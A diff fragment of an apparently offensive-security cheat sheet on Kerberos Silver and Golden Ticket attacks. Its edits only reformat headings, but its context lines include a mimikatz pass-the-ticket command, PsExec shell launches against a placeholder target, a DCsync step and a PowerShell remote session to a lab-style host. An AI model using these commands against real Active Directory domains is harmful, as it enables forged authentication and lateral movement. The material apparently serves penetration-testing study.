@@ -14,7 +14,7 @@ seo:
   robots: "" # custom robot tags (optional)
 ---
 
-**Silver Ticket :** 
+## Silver Ticket 
 
 On Linux
 
@@ -38,9 +38,9 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
 
-**Golden Ticket :**
+## Golden Ticket :
 
-On Windows
+**On Windows :**
 
 - DCsync :
  ```sh
@@ -77,7 +77,7 @@ Enter-PSSession trusteddc.trusted.vl
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
 
-On Linux
+**On Linux :**
 
 - Modifying krb5.conf : 
 ```sh
